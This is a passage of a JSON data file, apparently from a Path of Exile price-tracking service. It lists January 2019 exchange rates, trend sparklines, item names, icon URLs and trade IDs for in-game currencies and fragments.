Scrap","pay":{"id":0,"league_id":1,"pay_currency_id":26,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":6,"value":197.55050505050505,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":26,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":0.02,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[null,null,null,0,0,null,4.57],"totalChange":4.57},"receiveSparkLine":{"data":[0,0.72,1.65,10.01,9.9,10.01,10.01],"totalChange":10.01},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0,1.53,0.71,0.71,1.73,5.31],"totalChange":5.31},"lowConfidenceReceiveSparkLine":{"data":[0,0.72,1.65,10.01,9.9,10.01,10.01],"totalChange":10.01},"detailsId":"armourers-scrap"}],"currencyDetails":[{"id":1,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollRare.png?scale=1&w=1&h=1","name":"Chaos Orb","poeTradeId":4},{"id":2,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyAddModToRare.png?scale=1&w=1&h=1","name":"Exalted Orb","poeTradeId":6},{"id":3,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyModValues.png?scale=1&w=1&h=1","name":"Divine Orb","poeTradeId":15},{"id":4,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyUpgradeToRare.png?scale=1&w=1&h=1","name":"Orb of Alchemy","poeTradeId":3},{"id":5,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollSocketLinks.png?scale=1&w=1&h=1","name":"Orb of Fusing","poeTradeId":2},{"id":6,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollMagic.png?scale=1&w=1&h=1","name":"Orb of Alteration","poeTradeId":1},{"id":7,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyUpgradeMagicToRare.png?scale=1&w=1&h=1","name":"Regal Orb","poeTradeId":14},{"id":8,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyVaal.png?scale=1&w=1&h=1","name":"Vaal Orb","poeTradeId":16},{"id":9,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyPassiveSkillRefund.png?scale=1&w=1&h=1","name":"Orb of Regret","poeTradeId":13},{"id":10,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyMapQuality.png?scale=1&w=1&h=1","name":"Cartographer\'s Chisel","poeTradeId":10},{"id":11,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollSocketNumbers.png?scale=1&w=1&h=1","name":"Jeweller\'s Orb","poeTradeId":8},{"id":12,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SilverObol.png?scale=1&w=1&h=1","name":"Silver Coin","poeTradeId":35},{"id":13,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyCoin.png?scale=1&w=1&h=1","name":"Perandus Coin","poeTradeId":26},{"id":14,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyConvertToNormal.png?scale=1&w=1&h=1","name":"Orb of Scouring","poeTradeId":11},{"id":15,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyGemQuality.png?scale=1&w=1&h=1","name":"Gemcutter\'s Prism","poeTradeId":5},{"id":16,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyUpgradeRandomly.png?scale=1&w=1&h=1","name":"Orb of Chance","poeTradeId":9},{"id":17,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollSocketColours.png?scale=1&w=1&h=1","name":"Chromatic Orb","poeTradeId":7},{"id":18,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyImplicitMod.png?scale=1&w=1&h=1","name":"Blessed Orb","poeTradeId":12},{"id":19,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyFlaskQuality.png?scale=1&w=1&h=1","name":"Glassblower\'s Bauble","poeTradeId":21},{"id":20,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyAddModToMagic.png?scale=1&w=1&h=1","name":"Orb of Augmentation","poeTradeId":23},{"id":21,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyUpgradeToMagic.png?scale=1&w=1&h=1","name":"Orb of Transmutation","poeTradeId":22},{"id":22,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyDuplicate.png?scale=1&w=1&h=1","name":"Mirror of Kalandra","poeTradeId":24},{"id":23,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyIdentification.png?scale=1&w=1&h=1","name":"Scroll of Wisdom","poeTradeId":17},{"id":24,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyPortal.png?scale=1&w=1&h=1","name":"Portal Scroll","poeTradeId":18},{"id":25,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyWeaponQuality.png?scale=1&w=1&h=1","name":"Blacksmith\'s Whetstone","poeTradeId":20},{"id":26,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyArmourQuality.png?scale=1&w=1&h=1","name":"Armourer\'s Scrap","poeTradeId":19},{"id":27,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyImprintOrb.png?scale=1&w=1&h=1","name":"Eternal Orb","poeTradeId":25},{"id":28,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal04.png?scale=1&scaleIndex=0&w=1&h=1","name":"Sacrifice at Dusk","poeTradeId":27},{"id":29,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal01.png?scale=1&w=1&h=1&v=3b21ce0cd4c0b9e8cf5db6257daf831a3","name":"Sacrifice at Midnight","poeTradeId":28},{"id":30,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal02.png?scale=1&w=1&h=1&v=3ead6455599ec6c303f54ba98d6f8eb23","name":"Sacrifice at Dawn","poeTradeId":29},{"id":31,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal03.png?scale=1&w=1&h=1&v=ba374d543316349b87de121039c3cc6f3","name":"Sacrifice at Noon","poeTradeId":30},{"id":32,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal04.png?scale=1&w=1&h=1&v=735839ceae0fc45d15ec69555e9314133","name":"Mortal Grief","poeTradeId":31},{"id":33,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal01.png?scale=1&w=1&h=1&v=9336df5d7d0befd5963b71e7a68479ce3","name":"Mortal Rage","poeTradeId":32},{"id":34,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal03.png?scale=1&w=1&h=1&v=9fb218dad337a4627a59f74bfa2d6c863","name":"Mortal Ignorance","poeTradeId":34},{"id":35,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal02.png?scale=1&w=1&h=1&v=db5b529a8425bd2b9fd7bee9fca2e0183","name":"Mortal Hope","poeTradeId":33},{"id":36,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt01.png?scale=1&w=1&h=1&v=044cbdae1e06e621585eaa627c2162db3","name":"Eber\'s Key","poeTradeId":36},{"id":37,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt02.png?scale=1&w=1&h=1&v=757829336b7239c4b1e398c203f0cca03","name":"Yriel\'s Key","poeTradeId":37},{"id":38,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt03.png?scale=1&w=1&h=1&v=6e43b636847d46b560ef0518869a72943","name":"Inya\'s Key","poeTradeId":38},{"id":39,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt04.png?scale=1&w=1&h=1&v=5c3afc6bad631a50f9fe5ccb570aeb363","name":"Volkuur\'s Key","poeTradeId":39},{"id":40,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentHydra.png?scale=1&w=1&h=1&v=fd37e4be7672c0db8b549a1b16ad489d3","name":"Fragment of the Hydra","poeTradeId":41},{"id":41,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentPhoenix.png?scale=1&w=1&h=1&v=8f76720ab06bb40a6d6f75730f92e4a73","name":"Fragment of the Phoenix","poeTradeId":42},{"id":42,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentMinotaur.png?scale=1&w=1&h=1&v=e0e3f5e7daf32736d63fc3df1ba981223","name":"Fragment of the Minotaur","poeTradeId":43},{"id":43,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentChimera.png?scale=1&w=1&h=1&v=15bd6ba80e1853c22ae3acf40abf64283","name":"Fragment of the Chimera","poeTradeId":44},{"id":44,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/Labyrinth.png?scale=1&w=1&h=1&v=ef005aef5d2f9135d6922f4b1b912f783","name":"Offering to the Goddess","poeTradeId":40},{"id":45,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyImprintOrb.png?scale=1&w=1&h=1","name":"Stacked Deck","poeTradeId":-1},{"id":46,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AtlasRadiusWhite.png?scale=1&w=1&h=1","name":"Apprentice Cartographer\'s Sextant","poeTradeId":45},{"id":47,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AtlasRadiusYellow.png?scale=1&w=1&h=1","name":"Journeyman Cartographer\'s Sextant","poeTradeId":46},{"id":48,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AtlasRadiusRed.png?scale=1&w=1&h=1","name":"Master Cartographer\'s Sextant","poeTradeId":47},{"id":49,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealWhite.png?scale=1&w=1&h=1","name":"Apprentice Cartographer\'s Seal","poeTradeId":-1},{"id":50,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealYellow.png?scale=1&w=1&h=1","name":"Journeyman Cartographer\'s Seal","poeTradeId":-1},{"id":51,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealRed.png?scale=1&w=1&h=1","name":"Master Cartographer\'s Seal","poeTradeId":-1},{"id":52,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealRed.png?scale=1&w=1&h=1","name":"Sacrifice Set","poeTradeId":48},{"id":53,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealRed.png?scale=1&w=1&h=1","name":"Mortal Set","poeTradeId":49},{"id":54,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealRed.png?scale=1&w=1&h=1","name":"Pale Court Set","poeTradeId":50},{"id":55,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/SealRed.png?scale=1&w=1&h=1","name":"Shaper Set","poeTradeId":51},{"id":56,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachShardFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Splinter of Xoph","poeTradeId":52},{"id":57,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachShardCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Splinter of Tul","poeTradeId":53},{"id":58,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachShardLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Splinter of Esh","poeTradeId":54},{"id":59,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachShardPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Splinter of Uul-Netol","poeTradeId":55},{"id":60,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachShardChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Splinter of Chayula","poeTradeId":56},{"id":61,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachUpgraderFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Blessing of Xoph","poeTradeId":57},{"id":62,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachUpgraderCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Blessing of Tul","poeTradeId":58},{"id":63,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachUpgraderLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Blessing of Esh","poeTradeId":59},{"id":64,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachUpgraderPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Blessing of Uul-Netol","poeTradeId":60},{"id":65,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachUpgraderChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Blessing of Chayula","poeTradeId":61},{"id":66,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Xoph\'s Breachstone","poeTradeId":62},{"id":67,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Tul\'s Breachstone","poeTradeId":63},{"id":68,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Esh\'s Breachstone","poeTradeId":64},{"id":69,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Uul-Netol\'s Breachstone","poeTradeId":65},{"id":70,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Chayula\'s Breachstone","poeTradeId":66},{"id":71,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/VaultMap.png?scale=1&scaleIndex=0&w=1&h=1","name":"Ancient Reliquary Key","poeTradeId":494},{"id":72,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/SinFlaskEmpty.png?scale=1&scaleIndex=0&w=1&h=2","name":"Divine Vessel","poeTradeId":512},{"id":73,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AnnullOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Orb of Annulment","poeTradeId":513},{"id":74,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/BindingOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Orb of Binding","poeTradeId":514},{"id":75,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/HorizonOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Orb of Horizons","poeTradeId":515},{"id":76,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/HarbingerOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Harbinger\'s Orb","poeTradeId":516},{"id":77,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/EngineersOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Engineer\'s Orb","poeTradeId":517},{"id":78,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AncientOrb.png?scale=1&scaleIndex=0&w=1&h=1","name":"Ancient Orb","poeTradeId":518},{"id":79,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/AnnullShard.png?scale=1&scaleIndex=0&w=1&h=1","name":"Annulment Shard","poeTradeId":519},{"id":80,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/ExaltedShard.png?scale=1&scaleIndex=0&w=1&h=1","name":"Exalted Shard","poeTradeId":521},{"id":81,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/MirrorShard.png?scale=1&scaleIndex=0&w=1&h=1","name":"Mirror Shard","poeTradeId":520},{"id":82,"icon":"https://web.poecdn.com/image/Art/2DItems/Maps/VaultMap3.png?scale=1&scaleIndex=0&w=1&h=1","name":"Timeworn Reliquary Key","poeTradeId":-1},{"id":83,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Xoph\'s Charged Breachstone","poeTradeId":-1},{"id":84,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Tul\'s Charged Breachstone","poeTradeId":-1},{"id":85,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Esh\'s Charged Breachstone","poeTradeId":-1},{"id":86,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Uul-Netol\'s Charged Breachstone","poeTradeId":-1},{"id":87,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Chayula\'s Charged Breachstone","poeTradeId":-1},{"id":88,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Xoph\'s Enriched Breachstone","poeTradeId":-1},{"id":89,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Tul\'s Enriched Breachstone","poeTradeId":-1},{"id":90,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Esh\'s Enriched Breachstone","poeTradeId":-1},{"id":91,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Uul-Netol\'s Enriched Breachstone","poeTradeId":-1},{"id":92,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Chayula\'s Enriched Breachstone","poeTradeId":-1},{"id":93,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsFire.png?scale=1&scaleIndex=0&w=1&h=1","name":"Xoph\'s Pure Breachstone","poeTradeId":-1},{"id":94,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsCold.png?scale=1&scaleIndex=0&w=1&h=1","name":"Tul\'s Pure Breachstone","poeTradeId":-1},{"id":95,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsLightning.png?scale=1&scaleIndex=0&w=1&h=1","name":"Esh\'s Pure Breachstone","poeTradeId":-1},{"id":96,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsPhysical.png?scale=1&scaleIndex=0&w=1&h=1","name":"Uul-Netol\'s Pure Breachstone","poeTradeId":-1},{"id":97,"icon":"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsChaos.png?scale=1&scaleIndex=0&w=1&h=1","name":"Chayula\'s Pure Breachstone","poeTradeId":-1}],"map":{"Mirror of Kalandra":{"currencyTypeName":"Mirror of Kalandra","pay":{"id":0,"league_id":1,"pay_currency_id":22,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":0.0000300679,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":22,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":21,"value":34056,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0,0,0,0,-0.23],"totalChange":-0.23},"receiveSparkLine":{"data":[0,0.28,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"chaosEquivalent":33657.03,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,-0.23],"totalChange":-0.23},"lowConfidenceReceiveSparkLine":{"data":[0,0.28,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"detailsId":"mirror-of-kalandra"},"Eternal Orb":{"currencyTypeName":"Eternal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":27,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.0000479443816,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":27,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":9,"value":20480.064,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-0.06,-1.41,-6.03,-7.56,-4.16,-8.1],"totalChange":-8.1},"chaosEquivalent":20668.78,"lowConfidencePaySparkLine":{"data":[0,0,20,20,20,-14.29,25.15],"totalChange":25.15},"lowConfidenceReceiveSparkLine":{"data":[0,-0.06,-1.41,-6.03,-7.56,-4.16,-8.1],"totalChange":-8.1},"detailsId":"eternal-orb"},"Mirror Shard":{"currencyTypeName":"Mirror Shard","pay":{"id":0,"league_id":1,"pay_currency_id":81,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":0.00083,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":81,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":1729.2,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[null,null,null,0,null,null,null],"totalChange":0},"receiveSparkLine":{"data":[],"totalChange":0},"chaosEquivalent":1467.01,"lowConfidencePaySparkLine":{"data":[0,14.29,12.5,10.77,-13.25,-13.25,-13.25],"totalChange":-13.25},"lowConfidenceReceiveSparkLine":{"data":[0,0.29,0,0.76,0.76,-5.71,-5.71],"totalChange":-5.71},"detailsId":"mirror-shard"},"Blessing of Chayula":{"currencyTypeName":"Blessing of Chayula","pay":{"id":0,"league_id":1,"pay_currency_id":65,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.00435,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":65,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":267.4375,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,3.11,5,2.59,0.7,0.93,2.08],"totalChange":2.08},"chaosEquivalent":248.66,"lowConfidencePaySparkLine":{"data":[0,-1.52,-1.52,-3.47,-6.92,-10.34,-10.34],"totalChange":-10.34},"lowConfidenceReceiveSparkLine":{"data":[0,3.11,5,2.59,0.7,0.93,2.08],"totalChange":2.08},"detailsId":"blessing-of-chayula"},"Exalted Orb":{"currencyTypeName":"Exalted Orb","pay":{"id":0,"league_id":1,"pay_currency_id":2,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":0.00769,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":2,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":80,"value":132,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.65,0.78,0.78,0.78,0.78,0.78],"totalChange":0.78},"receiveSparkLine":{"data":[0,0.27,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"chaosEquivalent":131.02,"lowConfidencePaySparkLine":{"data":[0,0.65,0.78,0.78,0.78,0.78,0.78],"totalChange":0.78},"lowConfidenceReceiveSparkLine":{"data":[0,0.27,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"detailsId":"exalted-orb"},"Divine Orb":{"currencyTypeName":"Divine Orb","pay":{"id":0,"league_id":1,"pay_currency_id":3,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.03965841379310345,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":3,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":56,"value":26,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,1.21,2.33,0.7,4.18,4.18,5.07],"totalChange":5.07},"receiveSparkLine":{"data":[0,3.85,0.09,0.4,1.85,0,0],"totalChange":0},"chaosEquivalent":25.61,"lowConfidencePaySparkLine":{"data":[0,1.21,2.33,0.7,4.18,4.18,5.07],"totalChange":5.07},"lowConfidenceReceiveSparkLine":{"data":[0,3.85,0.09,0.4,1.85,0,0],"totalChange":0},"detailsId":"divine-orb"},"Harbinger\'s Orb":{"currencyTypeName":"Harbinger\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":76,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":0.04860216494845361,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":76,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":24.439393939393938,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-0.18,0.4,0.88,1.97,6.26,3.33],"totalChange":3.33},"receiveSparkLine":{"data":[0,0,0,0,0,0,-2.24],"totalChange":-2.24},"chaosEquivalent":22.51,"lowConfidencePaySparkLine":{"data":[0,-0.18,0.4,0.88,1.97,6.26,3.33],"totalChange":3.33},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,-2.24],"totalChange":-2.24},"detailsId":"harbingers-orb"},"Ancient Orb":{"currencyTypeName":"Ancient Orb","pay":{"id":0,"league_id":1,"pay_currency_id":78,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":7,"value":0.05,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":78,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":48,"value":22,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,5.26,5.26,5.26,5.26,5.26,5.26],"totalChange":5.26},"receiveSparkLine":{"data":[0,-0.38,4.82,3.56,0.27,0.27,0.27],"totalChange":0.27},"chaosEquivalent":21,"lowConfidencePaySparkLine":{"data":[0,5.26,5.26,5.26,5.26,5.26,5.26],"totalChange":5.26},"lowConfidenceReceiveSparkLine":{"data":[0,-0.38,4.82,3.56,0.27,0.27,0.27],"totalChange":0.27},"detailsId":"ancient-orb"},"Orb of Annulment":{"currencyTypeName":"Orb of Annulment","pay":{"id":0,"league_id":1,"pay_currency_id":73,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":20,"value":0.06667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":73,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":44,"value":18.8588,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,1.8,7.28,3.94,4.94,14.29,7.14],"totalChange":7.14},"receiveSparkLine":{"data":[0,3.62,15.44,15.81,15.24,15.81,14.95],"totalChange":14.95},"chaosEquivalent":16.93,"lowConfidencePaySparkLine":{"data":[0,1.8,7.28,3.94,4.94,14.29,7.14],"totalChange":7.14},"lowConfidenceReceiveSparkLine":{"data":[0,3.62,15.44,15.81,15.24,15.81,14.95],"totalChange":14.95},"detailsId":"orb-of-annulment"},"Blessing of Uul-Netol":{"currencyTypeName":"Blessing of Uul-Netol","pay":{"id":0,"league_id":1,"pay_currency_id":64,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.16667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":64,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":9,"value":9.350515463917526,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-30.77,-34,-15.58,-29.53,-24.46,-28.07],"totalChange":-28.07},"chaosEquivalent":7.68,"lowConfidencePaySparkLine":{"data":[null,null,0,33.33,66.66,66.66,99.99],"totalChange":99.99},"lowConfidenceReceiveSparkLine":{"data":[0,-30.77,-34,-15.58,-29.53,-24.46,-28.07],"totalChange":-28.07},"detailsId":"blessing-of-uul-netol"},"Exalted Shard":{"currencyTypeName":"Exalted Shard","pay":{"id":0,"league_id":1,"pay_currency_id":80,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":6,"value":0.16667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":80,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":11,"value":7,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0,null,null,0,0,0],"totalChange":0},"receiveSparkLine":{"data":[0,-11.74,-11.79,2.91,2.91,2.91,2.91],"totalChange":2.91},"chaosEquivalent":6.5,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,-11.74,-11.79,2.91,2.91,2.91,2.91],"totalChange":2.91},"detailsId":"exalted-shard"},"Master Cartographer\'s Sextant":{"currencyTypeName":"Master Cartographer\'s 